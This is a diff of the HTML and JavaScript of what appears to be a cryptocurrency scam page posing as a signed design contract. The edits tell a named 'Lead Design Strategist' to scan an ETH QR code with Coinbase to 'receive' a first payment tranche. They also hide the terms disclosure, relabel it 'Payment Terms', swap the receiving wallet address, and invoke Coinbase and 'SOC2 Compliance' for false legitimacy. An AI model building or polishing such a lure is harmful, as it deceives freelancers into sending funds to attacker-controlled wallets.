@@ -199,18 +199,24 @@ display: none !important;
         margin-bottom: 0.75rem;
     }
 
-    .footer-note {
-    margin-top: 1.5rem;
-    font-size: 0.75rem;
-    color: var(--text-muted);
-    text-align: center;
-    line-height: 1.3;
-    border-top: 1px solid #e8e2d9;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
+   .footer-note {
+  
+  font-size: 0.75rem;
+  color: var(--text-muted);
+  line-height: 1.4;
+  text-align: left;
 }
+
+.footer-note .inline-logo {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  object-fit: contain;
+  vertical-align: -0.18em;
+  margin: 0 0.2em;
+}
+
+
 
 
     .qr-section div {
@@ -773,22 +779,24 @@ display: none !important;
     <!-- Checkbox Card containing the Signature Section cleanly nested inside -->
     <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
     <div class="signature-section">
-        <h2 style="font-size: 13pt; font-weight: 700; color: #1a1615; border-left: 4px solid #d96b43; padding-left: 10px; margin: 0 0 15px 0;">Authorized Execution</h2>
-        <div class="sig-table">
-            <div class="sig-row">
-                <div class="sig-col">
-                    <p style="font-weight: 600; margin-bottom: 5px;">For Lead Design Strategist:</p>
-                    <div class="signature-font" id="contractorSignature">Anna Grzybowska</div>
-                    <div class="sig-box">
-                        <div class="sig-title" id="contractorSigTitle" style="display: none;">Anna Grzybowska</div>
-                        <div class="sig-sub">Date: <span id="sigDate">Loading...</span></div>
-                    </div>
-                </div>
-            </div>
+        <h2 style="font-size: 13pt; font-weight: 700; color: #1a1615; border-left: 4px solid #d96b43; padding-left: 10px; margin: 0 0 15px 0;">Budget Disbursal Acquisition</h2>
+ <div class="qr-section">
+            <div id="eth-qr"></div>
         </div>
-    </div>
+        <div class="footer-note">
+  <span>
+    The Lead Design Strategist is mandated to scan this using
+    <img
+      src="assets/pictures/download.png"
+      alt="Coinbase"
+      class="inline-logo"
+    />Coinbase's built-in QR scanner to receive their 1st Tranche for this Visual Architecture Suite (Phase 1) on the SOC2 Compliance Protocol.
+  </span>
+</div>
+        </div>
+    
     <div class="checkbox-container">
-        <span style="font-size: 11px; color: #635b54; font-weight: 600; line-height: 1;">Verified</span>
+        <span style="font-size: 11px; color: #635b54; font-weight: 600; line-height: 1;">Authorized</span>
         <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
     </div>
 </div>
@@ -823,9 +831,7 @@ display: none !important;
             </p>
         </div>
 
-        <div class="qr-section">
-            <div id="eth-qr"></div>
-        </div>
+       
 
         <div class="walletconnect-actions" style="display: none;">
             <button id="walletPayBtnEth" class="wallet-btn" onclick="handlePayClick()" style="display: none;">
@@ -833,10 +839,10 @@ display: none !important;
             </button>
         </div>
 
-        <div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: left; margin-top: 10px; justify-content: center; gap: 8px;">
+        <div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: left; margin-top: 10px; justify-content: center; gap: 8px; display: none;">
            By scanning using a Web3 wallet, you agree to <img src="assets/pictures/download.png" alt="Coinbase" style="width: 16px; height: 16px; object-fit: contain;">
     <span>Coinbase's 
-            <a href="https://www.coinbase.com/legal/user_agreement/united_states" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Terms of Service</a></span> for the SOC2 Compliance Protocol on this Visual Architecture Suite (Phase 1).
+            <a href="https://www.coinbase.com/legal/user_agreement/united_states" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Payment Terms</a></span> for the SOC2 Compliance Protocol on this Visual Architecture Suite (Phase 1).
         </div>
 
         <p id="eth-timer" style="display: none;">Verification expires in 05:00</p>
@@ -889,10 +895,17 @@ display: none !important;
         </div>
     </div>
 
-    <div class="footer-note">
-    <img src="assets/pictures/download.png" alt="Coinbase" style="width: 16px; height: 16px; object-fit: contain;">
-    <span>Coinbase • SOC2 Compliance Protocol</span>
-</div>
+    <div class="sig-table">
+            <div class="sig-row">
+                <div class="sig-col">
+                    <p style="font-weight: 600; margin-bottom: 5px;">For Lead Design Strategist:</p>
+                    <div class="signature-font" id="contractorSignature">Anna Grzybowska</div>
+                    <div class="sig-box">
+                        <div class="sig-title" id="contractorSigTitle" style="display: none;">Anna Grzybowska</div>
+                        <div class="sig-sub">Date: <span id="sigDate">Loading...</span></div>
+                    </div>
+                </div>
+            </div>
 </div>
 
     <footer>
@@ -1085,11 +1098,11 @@ let paymentDone = false;
 const SOURCE_TIMER_KEY = "avb_expiry_times";
 
 const wallets = [
-    "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    "0x08b8ff11321eFfa255E789b8946b4096675AF50b",
     "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
 ];
 const tokens = {
-    ETH: "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    ETH: "0x08b8ff11321eFfa255E789b8946b4096675AF50b",
     BNB: "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
 };
 
